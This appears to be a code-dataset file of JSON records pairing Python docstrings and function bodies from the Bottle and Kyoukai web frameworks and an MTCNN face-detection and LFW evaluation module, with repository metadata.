{"docstring": "''' This matches comments and all kinds of quoted strings but does\n    NOT match comments (#...) within quoted strings. (trust me) '''\n", "func_signal": "def re_pytokens(cls):\n", "code": "return re.compile(r'''\n    (''(?!')|\"\"(?!\")|'{6}|\"{6}    # Empty strings (all 4 types)\n     |'(?:[^\\\\']|\\\\.)+?'          # Single quotes (')\n     |\"(?:[^\\\\\"]|\\\\.)+?\"          # Double quotes (\")\n     |'{3}(?:[^\\\\]|\\\\.|\\n)+?'{3}  # Triple-quoted strings (')\n     |\"{3}(?:[^\\\\]|\\\\.|\\n)+?\"{3}  # Triple-quoted strings (\")\n     |\\#.*                        # Comments\n    )''', re.VERBOSE)", "path": "example\\_bottle.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
{"docstring": "''' Return a (target, url_agrs) tuple or raise HTTPError(400/404/405). '''\n", "func_signal": "def match(self, environ):\n", "code": "path, targets, urlargs = environ['PATH_INFO'] or '/', None, {}\nif path in self.static:\n    targets = self.static[path]\nelse:\n    for combined, rules in self.dynamic:\n        match = combined.match(path)\n        if not match: continue\n        getargs, targets = rules[match.lastindex - 1]\n        urlargs = getargs(path) if getargs else {}\n        break\n\nif not targets:\n    raise HTTPError(404, \"Not found: \" + repr(environ['PATH_INFO']))\nmethod = environ['REQUEST_METHOD'].upper()\nif method in targets:\n    return targets[method], urlargs\nif method == 'HEAD' and 'GET' in targets:\n    return targets['GET'], urlargs\nif 'ANY' in targets:\n    return targets['ANY'], urlargs\nallowed = [verb for verb in targets if verb != 'ANY']\nif 'GET' in allowed and 'HEAD' not in allowed:\n    allowed.append('HEAD')\nraise HTTPError(405, \"Method not allowed.\",\n                header=[('Allow',\",\".join(allowed))])", "path": "example\\_bottle.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
{"docstring": "\"\"\" The HTTP request body as a seek-able file-like object. Depending on\n    :attr:`MEMFILE_MAX`, this is either a temporary file or a\n    :class:`io.BytesIO` instance. Accessing this property for the first\n    time reads and replaces the ``wsgi.input`` environ variable.\n    Subsequent accesses just do a `seek(0)` on the file object. \"\"\"\n", "func_signal": "def body(self):\n", "code": "self._body.seek(0)\nreturn self._body", "path": "example\\_bottle.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
{"docstring": "\"\"\" Cookies parsed into a :class:`FormsDict`. Signed cookies are NOT\n    decoded. Use :meth:`get_cookie` if you expect signed cookies. \"\"\"\n", "func_signal": "def cookies(self):\n", "code": "cookies = SimpleCookie(self.environ.get('HTTP_COOKIE',''))\ncookies = list(cookies.values())[:self.MAX_PARAMS]\nreturn FormsDict((c.key, c.value) for c in cookies)", "path": "example\\_bottle.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
{"docstring": "\"\"\"Douban API call must set `access_token` in headers\"\"\"\n", "func_signal": "def http_add_header(self, req):\n", "code": "if getattr(self, 'access_token', None) is None:\n    return\nreq.add_header('Authorization',  'Bearer %s' % self.access_token)", "path": "socialoauth\\sites\\douban.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
{"docstring": "\"\"\" A list of all IPs that were involved in this request, starting with\n    the client IP and followed by zero or more proxies. This does only\n    work if all proxies support the ```X-Forwarded-For`` header. Note\n    that this information can be forged by malicious clients. \"\"\"\n", "func_signal": "def remote_route(self):\n", "code": "proxy = self.environ.get('HTTP_X_FORWARDED_FOR')\nif proxy: return [ip.strip() for ip in proxy.split(',')]\nremote = self.environ.get('REMOTE_ADDR')\nreturn [remote] if remote else []", "path": "example\\_bottle.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
{"docstring": "''' Decorator: renders a template for a handler.\n    The handler can control its behavior like that:\n\n      - return a dict of template vars to fill out the template\n      - return something other than a dict and the view decorator will not\n        process the template, but return the handler result as is.\n        This includes returning a HTTPResponse(dict) to get,\n        for instance, JSON with autojson or other castfilters.\n'''\n", "func_signal": "def view(tpl_name, **defaults):\n", "code": "def decorator(func):\n    @functools.wraps(func)\n    def wrapper(*args, **kwargs):\n        result = func(*args, **kwargs)\n        if isinstance(result, (dict, DictMixin)):\n            tplvars = defaults.copy()\n            tplvars.update(result)\n            return template(tpl_name, **tplvars)\n        return result\n    return wrapper\nreturn decorator", "path": "example\\_bottle.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
{"docstring": "\"\"\"\nValidates and manipulates keyword arguments by user defined callables.\nHandles ValueError and missing arguments by raising HTTPError(403).\n\"\"\"\n", "func_signal": "def validate(**vkargs):\n", "code": "depr('Use route wildcard filters instead.')\ndef decorator(func):\n    @functools.wraps(func)\n    def wrapper(*args, **kargs):\n        for key, value in vkargs.iteritems():\n            if key not in kargs:\n                abort(403, 'Missing parameter: %s' % key)\n            try:\n                kargs[key] = value(kargs[key])\n            except ValueError:\n                abort(403, 'Wrong parameter format for: %s' % key)\n        return func(*args, **kargs)\n    return wrapper\nreturn decorator", "path": "example\\_bottle.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
{"docstring": "\"\"\" Removes comments (#...) from python code. \"\"\"\n", "func_signal": "def split_comment(cls, code):\n", "code": "if '#' not in code: return code\n#: Remove comments only (leave quoted strings as they are)\nsubf = lambda m: '' if m.group(0)[0]=='#' else m.group(0)\nreturn re.sub(cls.re_pytokens, subf, code)", "path": "example\\_bottle.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
{"docstring": "''' The initial portion of the URL's `path` that was removed by a higher\n    level (server or routing middleware) before the application was\n    called. This script path is returned with leading and tailing\n    slashes. '''\n", "func_signal": "def script_name(self):\n", "code": "script_name = self.environ.get('SCRIPT_NAME', '').strip('/')\nreturn '/' + script_name + '/' if script_name else '/'", "path": "example\\_bottle.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
{"docstring": "''' The :attr:`query_string` parsed into a :class:`FormsDict`. These\n    values are sometimes called \"URL arguments\" or \"GET parameters\", but\n    not to be confused with \"URL wildcards\" as they are provided by the\n    :class:`Router`. '''\n", "func_signal": "def query(self):\n", "code": "get = self.environ['bottle.get'] = FormsDict()\npairs = _parse_qsl(self.environ.get('QUERY_STRING', ''))\nfor key, value in pairs[:self.MAX_PARAMS]:\n    get[key] = value\nreturn get", "path": "example\\_bottle.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
{"docstring": "\"\"\" Aborts execution and causes a 303 or 302 redirect, depending on\n    the HTTP protocol version. \"\"\"\n", "func_signal": "def redirect(url, code=None):\n", "code": "if code is None:\n    code = 303 if request.get('SERVER_PROTOCOL') == \"HTTP/1.1\" else 302\nlocation = urljoin(request.url, url)\nraise HTTPResponse(\"\", status=code, header=dict(Location=location))", "path": "example\\_bottle.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
{"docstring": "''' Parses a rule into a (name, filter, conf) token stream. If mode is\n    None, name contains a static rule part. '''\n", "func_signal": "def parse_rule(self, rule):\n", "code": "offset, prefix = 0, ''\nfor match in self.rule_syntax.finditer(rule):\n    prefix += rule[offset:match.start()]\n    g = match.groups()\n    if len(g[0])%2: # Escaped wildcard\n        prefix += match.group(0)[len(g[0]):]\n        offset = match.end()\n        continue\n    if prefix: yield prefix, None, None\n    name, filtr, conf = g[1:4] if not g[2] is None else g[4:7]\n    if not filtr: filtr = self.default_filter\n    yield name, filtr, conf or None\n    offset, prefix = match.end(), ''\nif offset <= len(rule) or prefix:\n    yield prefix+rule[offset:], None, None", "path": "example\\_bottle.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
{"docstring": "''' Remove a callback from a hook. '''\n", "func_signal": "def remove(self, name, func):\n", "code": "was_empty = self._empty()\nif name in self.hooks and func in self.hooks[name]:\n    self.hooks[name].remove(func)\nif self.app and not was_empty and self._empty(): self.app.reset()", "path": "example\\_bottle.py", "repo_name": "yueyoum/social-oauth", "stars": 325, "license": "mit", "language": "python", "size": 162}
{"docstring": "\"\"\"\nTests wrapping a Response object.\n\"\"\"\n", "func_signal": "def test_wrap_response():\n", "code": "r1 = wrap_response((\"Hello, world!\",))\nassert r1.data == b\"Hello, world!\"\nassert r1.status_code == 200\n\nr2 = wrap_response((\"a\", 204))\nassert r2.data == b\"a\"\nassert r2.status_code == 204\n\nr3 = wrap_response((\"a\", 401, {\"Content-Type\": \"application/json\"}))  # weird json\nassert r3.data == b\"a\"\nassert r3.status_code == 401\nassert r3.headers[\"Content-Type\"] == \"application/json\"", "path": "test_kyoukai.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "\"\"\"\nGets a chunk of data from the queue.\n\"\"\"\n", "func_signal": "def get_chunk(self) -> bytes:\n", "code": "try:\n    d = self.body.get_nowait()\n    if d == REQUEST_FINISHED:\n        return b\"\"\nexcept asyncio.QueueEmpty:\n    return b\"\"\n\nreturn d", "path": "kyoukai\\backends\\http2.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "\"\"\"\nCalled when a message is complete.\nThis creates the worker task which will begin processing the request.\n\"\"\"\n", "func_signal": "def on_message_complete(self):\n", "code": "task = self.loop.create_task(self._wait_wrapper())\nself.waiter = task", "path": "kyoukai\\backends\\httptools_.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "\"\"\"\n:return: The combined prefix (parent + ours) of this Blueprint.\n\n.. versionadded:: 2.2.0\n\"\"\"\n", "func_signal": "def computed_prefix(self) -> str:\n", "code": "if self._parent:\n    return self._parent.computed_prefix + self._prefix\n\nreturn self._prefix", "path": "kyoukai\\blueprint.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "\"\"\"\n:return: A generator that yields all routes from the tree, from parent to children.\n\"\"\"\n", "func_signal": "def tree_routes(self) -> 'typing.Generator[Route, None, None]':\n", "code": "for route in self.routes:\n    yield route\n\nfor child in self._children:\n    yield from child.tree_routes", "path": "kyoukai\\blueprint.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "\"\"\"\nGets the :class:`werkzeug.routing.Submount` for this Blueprint.\n\n.. versionadded:: 2.2.0\n\"\"\"\n", "func_signal": "def get_submount(self) -> Submount:\n", "code": "inner = []\n# get child submounts\nfor bp in self._children:\n    inner.append(bp.get_submount())\n\n# get route submounts\nfor route in self.routes:\n    inner.append(route.get_submount())\n\n# create the submount\nsm = Submount(self._prefix,\n              rules=inner)\n\nreturn sm", "path": "kyoukai\\blueprint.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "\"\"\"\nCalled by the protocol once the Response is writable to submit the request to the HTTP/2 state machine.\n\"\"\"\n# This header must be added first!\n# All psuedo-headers come before the other headers.\n", "func_signal": "def get_response_headers(self):\n", "code": "headers = [(\":status\", self._emit_status)]\nheaders.extend(self._emit_headers)\n\n# Send the response headers.\nreturn headers", "path": "kyoukai\\backends\\http2.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "\"\"\"\nTraverses the tree for children Blueprints.\n\"\"\"\n", "func_signal": "def traverse_tree(self) -> 'typing.Generator[Blueprint, None, None]':\n", "code": "for child in self._children:\n    yield from child.traverse_tree()\n    yield child", "path": "kyoukai\\blueprint.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "# add the required attrs which are used on a scan later\n", "func_signal": "def inner(func):\n", "code": "func.in_group = True\nfunc.rg_delegate = \"route\"\nfunc.route_kwargs = kwargs\n\n# try and append to the routes\n# failing that, create a new list\ntry:\n    func.routes.append((url, methods))\nexcept AttributeError:\n    func.routes = [(url, methods)]\n\nif not hasattr(func, \"route_hooks\"):\n    func.route_hooks = collections.defaultdict(lambda: [])\n\n    # helper for route-specific hooks.\n    def hook(type_: str):\n        def _inner2(hookfunc):\n            func.route_hooks[type_].append(hookfunc)\n            return hookfunc\n\n        return _inner2\n\n    func.hook = hook\n    func.before_request = hook(\"pre\")\n    func.after_request = hook(\"post\")\n\nreturn func", "path": "kyoukai\\routegroup.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "\"\"\"\nOverride of `__init__` to store the blueprint params.\n\"\"\"\n", "func_signal": "def __init__(self, name, bases, class_body, **kwargs):\n", "code": "super().__init__(name, bases, class_body)\nself._bp_kwargs = kwargs", "path": "kyoukai\\routegroup.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "\"\"\"\nCalled when the headers have been completely sent.\n\"\"\"\n\n", "func_signal": "def on_headers_complete(self):\n", "code": "\n\"\"\"\nCalled when part of the body has been received.\n\n:param body: The body text.\n\"\"\"\nself.body.write(body)\nif self.body.tell() >= self.MAX_BODY_SIZE:\n    # write a \"too big\" message\n    self.write(HTTP_TOO_BIG)\n    self.close()", "path": "kyoukai\\backends\\httptools_.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "\"\"\"\nCalled when a message begins.\n\"\"\"\n", "func_signal": "def on_message_begin(self):\n", "code": "self.body = BytesIO()\nself.headers = []\nself.full_url = \"\"", "path": "kyoukai\\backends\\httptools_.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "\"\"\"\nCalled on the root Blueprint when all Blueprints have been registered and the app is \nstarting.\n\nThis will automatically build a :class:`werkzeug.routing.Map` of \n:class:`werkzeug.routing.Rule` objects for each Blueprint.\n\n.. note::\n\n    Calling this on sub-blueprints will have no effect, apart from generating a Map.  \n    It is recommended to only call this on the root Blueprint.\n    \n.. versionchanged:: 2.2.0\n\n    This now uses submounts instead of a giant rule amalgamation.\n\n:param map_options: The options to pass to the created Map.\n:return: The :class:`werkzeug.routing.Map` created from the routing tree.\n\"\"\"\n", "func_signal": "def finalize(self, **map_options) -> Map:\n", "code": "if self.finalized is True:\n    return self.map\n\nsubmount = self.get_submount()\nlogger.info(\"Scanned {} route(s) in the routing tree, building routing mapping.\"\n            .format(sum(1 for x in submount.get_rules(submount))))\n\n# Make a new Map() out of all of the routes.\nrule_map = Map([submount], host_matching=self._host_matching, **map_options)\n\nlogger.info(\"Built route mapping with {} rules.\".format(len(rule_map._rules)))\n\n# update self.map\nself.map = rule_map\nself.finalized = True\n\nreturn rule_map", "path": "kyoukai\\blueprint.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "\"\"\"\nGets the endpoint name for this route.\n\n:param bp: The :class:`.Blueprint` to use for name calculation.\n:return: The endpoint that can be used.\n\"\"\"\n", "func_signal": "def get_endpoint_name(self, bp=None) -> str:\n", "code": "if self.endpoint is not None:\n    return self.endpoint\n\nif bp is not None:\n    prefix = bp.name\nelse:\n    prefix = self.bp.name if self.bp else \"\"\n\nreturn \"{}.{}\".format(prefix, self._callable.__name__)", "path": "kyoukai\\route.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "# reset the root blueprint\n", "func_signal": "def __exit__(self, exc_type, exc_val, exc_tb):\n", "code": "del self.app._root_bp\nself.app._root_bp = self._old_root\n\nif exc_type:\n    return False\n\nreturn True", "path": "kyoukai\\testing.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "\"\"\"\n:return: The host for this Blueprint, or the host of any parent Blueprint. \n\"\"\"\n", "func_signal": "def host(self) -> str:\n", "code": "if self._parent:\n    return self._host or self.parent.host\n\nreturn self._host", "path": "kyoukai\\blueprint.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "\"\"\"\nFinalizes the app and blueprints.\n\nThis will calculate the current :class:`werkzeug.routing.Map` which is required for \nrouting to work.\n\n:param map_options: The options to pass to the Map for routing.\n\"\"\"\n", "func_signal": "def finalize(self, **map_options) -> Map:\n", "code": "self.debug = self.config.get(\"debug\", False)\n\nreturn self.root.finalize(**map_options)", "path": "kyoukai\\app.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "\"\"\"\nInitializes the Blueprint used by this route group.\n\n:param obb: The route group instance to intialize. \n\"\"\"\n# circular imports tm\n", "func_signal": "def _init_blueprint(self, obb):\n", "code": "from kyoukai.blueprint import Blueprint\nbp = Blueprint(self.__name__, **self._bp_kwargs)\n# get all the method types that have a `.route` attr on them\nfor name, value in inspect.getmembers(obb):\n    # unwrap methods\n    if not hasattr(value, \"__func__\"):\n        continue\n\n    func = value.__func__\n    if getattr(func, \"in_group\", False) is True:\n        # check the delegate type\n        if func.rg_delegate == \"route\":\n            # wrap value, but use func attrs\n            # this preserves the method and `self`\n            rtt = bp.wrap_route(value, **func.route_kwargs)\n            rtt.routes = func.routes\n            rtt.bp = bp\n\n            # copy hooks\n            for type_, hooks in func.route_hooks.items():\n                for hook in hooks:\n                    rtt.add_hook(type_, hook)\n\n            bp.routes.append(rtt)\n        elif func.rg_delegate == \"errorhandler\":\n            # add the error handler using `errorhandler_code`\n            for code in func.errorhandler_codes:\n                bp.add_errorhandler(value, code)\n        elif func.rg_delegate == \"hook\":\n            # add the hook\n            bp.add_hook(func.hook_type, value)\n\nsetattr(obb, \"_{.__name__}__blueprint\".format(self), bp)", "path": "kyoukai\\routegroup.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "\"\"\"\n:return: A submount that represents this route.\n\n.. versionadded:: 2.2.0\n\n.. versionchanged:: 2.x.x\n\n    Changed from getting a list of rules to a single submount object.\n\"\"\"\n", "func_signal": "def get_submount(self) -> Submount:\n", "code": "rules = []\n\nfor url, methods in self.routes:\n    # mutable list thx\n    methods = list(methods)\n    if \"OPTIONS\" not in methods:\n        methods.append(\"OPTIONS\")\n\n    rule = Rule(url, methods=methods,\n                host=self.bp.host if self.bp is not None else None,\n                endpoint=self.get_endpoint_name())\n\n    rules.append(rule)\n\n# pass an empty prefix since we don't care about adding that\nsubmount = Submount(\"\", rules)\nreturn submount", "path": "kyoukai\\route.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "\"\"\"\nWraps a callable in a Route.\nThis is required for routes to be added.\n\n:param cbl: The callable to wrap.\n:return: A new :class:`~.Route` object.\n\"\"\"\n", "func_signal": "def wrap_route(self, cbl, *args, **kwargs) -> Route:\n", "code": "rtt = Route(cbl, *args, **kwargs)\nreturn rtt", "path": "kyoukai\\blueprint.py", "repo_name": "Fuyukai/Kyoukai", "stars": 300, "license": "mit", "language": "python", "size": 1780}
{"docstring": "# Calculate evaluation metrics\n", "func_signal": "def evaluate(embeddings, actual_issame, nrof_folds=10):\n", "code": "thresholds = np.arange(0, 4, 0.01)\nembeddings1 = embeddings[0::2]\nembeddings2 = embeddings[1::2]\ntpr, fpr, accuracy = facenet.calculate_roc(thresholds, embeddings1, embeddings2,\n    np.asarray(actual_issame), nrof_folds=nrof_folds)\nthresholds = np.arange(0, 4, 0.001)\nval, val_std, far = facenet.calculate_val(thresholds, embeddings1, embeddings2,\n    np.asarray(actual_issame), 1e-3, nrof_folds=nrof_folds)\nreturn tpr, fpr, accuracy, val, val_std, far", "path": "understand_facenet\\lfw.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
{"docstring": "\"\"\"Detects faces in a list of images\nimages: list containing input images\ndetection_window_size_ratio: ratio of minimum face size to smallest image dimension\npnet, rnet, onet: caffemodel\nthreshold: threshold=[th1 th2 th3], th1-3 are three steps's threshold [0-1]\nfactor: the factor used to create a scaling pyramid of face sizes to detect in the image.\n\"\"\"\n", "func_signal": "def bulk_detect_face(images, detection_window_size_ratio, pnet, rnet, onet, threshold, factor):\n", "code": "all_scales = [None] * len(images)\nimages_with_boxes = [None] * len(images)\n\nfor i in range(len(images)):\n    images_with_boxes[i] = {'total_boxes': np.empty((0, 9))}\n\n# create scale pyramid\nfor index, img in enumerate(images):\n    all_scales[index] = []\n    h = img.shape[0]\n    w = img.shape[1]\n    minsize = int(detection_window_size_ratio * np.minimum(w, h))\n    factor_count = 0\n    minl = np.amin([h, w])\n    if minsize <= 12:\n        minsize = 12\n\n    m = 12.0 / minsize\n    minl = minl * m\n    while minl >= 12:\n        all_scales[index].append(m * np.power(factor, factor_count))\n        minl = minl * factor\n        factor_count += 1\n\n# # # # # # # # # # # # #\n# first stage - fast proposal network (pnet) to obtain face candidates\n# # # # # # # # # # # # #\n\nimages_obj_per_resolution = {}\n\n# TODO: use some type of rounding to number module 8 to increase probability that pyramid images will have the same resolution across input images\n\nfor index, scales in enumerate(all_scales):\n    h = images[index].shape[0]\n    w = images[index].shape[1]\n\n    for scale in scales:\n        hs = int(np.ceil(h * scale))\n        ws = int(np.ceil(w * scale))\n\n        if (ws, hs) not in images_obj_per_resolution:\n            images_obj_per_resolution[(ws, hs)] = []\n\n        im_data = imresample(images[index], (hs, ws))\n        im_data = (im_data - 127.5) * 0.0078125\n        img_y = np.transpose(im_data, (1, 0, 2))  # caffe uses different dimensions ordering\n        images_obj_per_resolution[(ws, hs)].append({'scale': scale, 'image': img_y, 'index': index})\n\nfor resolution in images_obj_per_resolution:\n    images_per_resolution = [i['image'] for i in images_obj_per_resolution[resolution]]\n    outs = pnet(images_per_resolution)\n\n    for index in range(len(outs[0])):\n        scale = images_obj_per_resolution[resolution][index]['scale']\n        image_index = images_obj_per_resolution[resolution][index]['index']\n        out0 = np.transpose(outs[0][index], (1, 0, 2))\n        out1 = np.transpose(outs[1][index], (1, 0, 2))\n\n        boxes, _ = generateBoundingBox(out1[:, :, 1].copy(), out0[:, :, :].copy(), scale, threshold[0])\n\n        # inter-scale nms\n        pick = nms(boxes.copy(), 0.5, 'Union')\n        if boxes.size > 0 and pick.size > 0:\n            boxes = boxes[pick, :]\n            images_with_boxes[image_index]['total_boxes'] = np.append(images_with_boxes[image_index]['total_boxes'],\n                                                                      boxes,\n                                                                      axis=0)\n\nfor index, image_obj in enumerate(images_with_boxes):\n    numbox = image_obj['total_boxes'].shape[0]\n    if numbox > 0:\n        h = images[index].shape[0]\n        w = images[index].shape[1]\n        pick = nms(image_obj['total_boxes'].copy(), 0.7, 'Union')\n        image_obj['total_boxes'] = image_obj['total_boxes'][pick, :]\n        regw = image_obj['total_boxes'][:, 2] - image_obj['total_boxes'][:, 0]\n        regh = image_obj['total_boxes'][:, 3] - image_obj['total_boxes'][:, 1]\n        qq1 = image_obj['total_boxes'][:, 0] + image_obj['total_boxes'][:, 5] * regw\n        qq2 = image_obj['total_boxes'][:, 1] + image_obj['total_boxes'][:, 6] * regh\n        qq3 = image_obj['total_boxes'][:, 2] + image_obj['total_boxes'][:, 7] * regw\n        qq4 = image_obj['total_boxes'][:, 3] + image_obj['total_boxes'][:, 8] * regh\n        image_obj['total_boxes'] = np.transpose(np.vstack([qq1, qq2, qq3, qq4, image_obj['total_boxes'][:, 4]]))\n        image_obj['total_boxes'] = rerec(image_obj['total_boxes'].copy())\n        image_obj['total_boxes'][:, 0:4] = np.fix(image_obj['total_boxes'][:, 0:4]).astype(np.int32)\n        dy, edy, dx, edx, y, ey, x, ex, tmpw, tmph = pad(image_obj['total_boxes'].copy(), w, h)\n\n        numbox = image_obj['total_boxes'].shape[0]\n        tempimg = np.zeros((24, 24, 3, numbox))\n\n        if numbox > 0:\n            for k in range(0, numbox):\n                tmp = np.zeros((int(tmph[k]), int(tmpw[k]), 3))\n                tmp[dy[k] - 1:edy[k], dx[k] - 1:edx[k], :] = images[index][y[k] - 1:ey[k], x[k] - 1:ex[k], :]\n                if tmp.shape[0] > 0 and tmp.shape[1] > 0 or tmp.shape[0] == 0 and tmp.shape[1] == 0:\n                    tempimg[:, :, :, k] = imresample(tmp, (24, 24))\n                else:\n                    return np.empty()\n\n            tempimg = (tempimg - 127.5) * 0.0078125\n            image_obj['rnet_input'] = np.transpose(tempimg, (3, 1, 0, 2))\n\n# # # # # # # # # # # # #\n# second stage - refinement of face candidates with rnet\n# # # # # # # # # # # # #\n\nbulk_rnet_input = np.empty((0, 24, 24, 3))\nfor index, image_obj in enumerate(images_with_boxes):\n    if 'rnet_input' in image_obj:\n        bulk_rnet_input = np.append(bulk_rnet_input, image_obj['rnet_input'], axis=0)\n\nout = rnet(bulk_rnet_input)\nout0 = np.transpose(out[0])\nout1 = np.transpose(out[1])\nscore = out1[1, :]\n\ni = 0\nfor index, image_obj in enumerate(images_with_boxes):\n    if 'rnet_input' not in image_obj:\n        continue\n\n    rnet_input_count = image_obj['rnet_input'].shape[0]\n    score_per_image = score[i:i + rnet_input_count]\n    out0_per_image = out0[:, i:i + rnet_input_count]\n\n    ipass = np.where(score_per_image > threshold[1])\n    image_obj['total_boxes'] = np.hstack([image_obj['total_boxes'][ipass[0], 0:4].copy(),\n                                          np.expand_dims(score_per_image[ipass].copy(), 1)])\n\n    mv = out0_per_image[:, ipass[0]]\n\n    if image_obj['total_boxes'].shape[0] > 0:\n        h = images[index].shape[0]\n        w = images[index].shape[1]\n        pick = nms(image_obj['total_boxes'], 0.7, 'Union')\n        image_obj['total_boxes'] = image_obj['total_boxes'][pick, :]\n        image_obj['total_boxes'] = bbreg(image_obj['total_boxes'].copy(), np.transpose(mv[:, pick]))\n        image_obj['total_boxes'] = rerec(image_obj['total_boxes'].copy())\n\n        numbox = image_obj['total_boxes'].shape[0]\n\n        if numbox > 0:\n            tempimg = np.zeros((48, 48, 3, numbox))\n            image_obj['total_boxes'] = np.fix(image_obj['total_boxes']).astype(np.int32)\n            dy, edy, dx, edx, y, ey, x, ex, tmpw, tmph = pad(image_obj['total_boxes'].copy(), w, h)\n\n            for k in range(0, numbox):\n                tmp = np.zeros((int(tmph[k]), int(tmpw[k]), 3))\n                tmp[dy[k] - 1:edy[k], dx[k] - 1:edx[k], :] = images[index][y[k] - 1:ey[k], x[k] - 1:ex[k], :]\n                if tmp.shape[0] > 0 and tmp.shape[1] > 0 or tmp.shape[0] == 0 and tmp.shape[1] == 0:\n                    tempimg[:, :, :, k] = imresample(tmp, (48, 48))\n                else:\n                    return np.empty()\n            tempimg = (tempimg - 127.5) * 0.0078125\n            image_obj['onet_input'] = np.transpose(tempimg, (3, 1, 0, 2))\n\n    i += rnet_input_count\n\n# # # # # # # # # # # # #\n# third stage - further refinement and facial landmarks positions with onet\n# # # # # # # # # # # # #\n\nbulk_onet_input = np.empty((0, 48, 48, 3))\nfor index, image_obj in enumerate(images_with_boxes):\n    if 'onet_input' in image_obj:\n        bulk_onet_input = np.append(bulk_onet_input, image_obj['onet_input'], axis=0)\n\nout = onet(bulk_onet_input)\n\nout0 = np.transpose(out[0])\nout1 = np.transpose(out[1])\nout2 = np.transpose(out[2])\nscore = out2[1, :]\npoints = out1\n\ni = 0\nret = []\nfor index, image_obj in enumerate(images_with_boxes):\n    if 'onet_input' not in image_obj:\n        ret.append(None)\n        continue\n\n    onet_input_count = image_obj['onet_input'].shape[0]\n\n    out0_per_image = out0[:, i:i + onet_input_count]\n    score_per_image = score[i:i + onet_input_count]\n    points_per_image = points[:, i:i + onet_input_count]\n\n    ipass = np.where(score_per_image > threshold[2])\n    points_per_image = points_per_image[:, ipass[0]]\n\n    image_obj['total_boxes'] = np.hstack([image_obj['total_boxes'][ipass[0], 0:4].copy(),\n                                          np.expand_dims(score_per_image[ipass].copy(), 1)])\n    mv = out0_per_image[:, ipass[0]]\n\n    w = image_obj['total_boxes'][:, 2] - image_obj['total_boxes'][:, 0] + 1\n    h = image_obj['total_boxes'][:, 3] - image_obj['total_boxes'][:, 1] + 1\n    points_per_image[0:5, :] = np.tile(w, (5, 1)) * points_per_image[0:5, :] + np.tile(\n        image_obj['total_boxes'][:, 0], (5, 1)) - 1\n    points_per_image[5:10, :] = np.tile(h, (5, 1)) * points_per_image[5:10, :] + np.tile(\n        image_obj['total_boxes'][:, 1], (5, 1)) - 1\n\n    if image_obj['total_boxes'].shape[0] > 0:\n        image_obj['total_boxes'] = bbreg(image_obj['total_boxes'].copy(), np.transpose(mv))\n        pick = nms(image_obj['total_boxes'].copy(), 0.7, 'Min')\n        image_obj['total_boxes'] = image_obj['total_boxes'][pick, :]\n        points_per_image = points_per_image[:, pick]\n\n        ret.append((image_obj['total_boxes'], points_per_image))\n    else:\n        ret.append(None)\n\n    i += onet_input_count\n\nreturn ret", "path": "understand_facenet\\align\\detect_face.py", "repo_name": "boyliwensheng/understand_facenet", "stars": 461, "license": "None", "language": "python", "size": 1924}
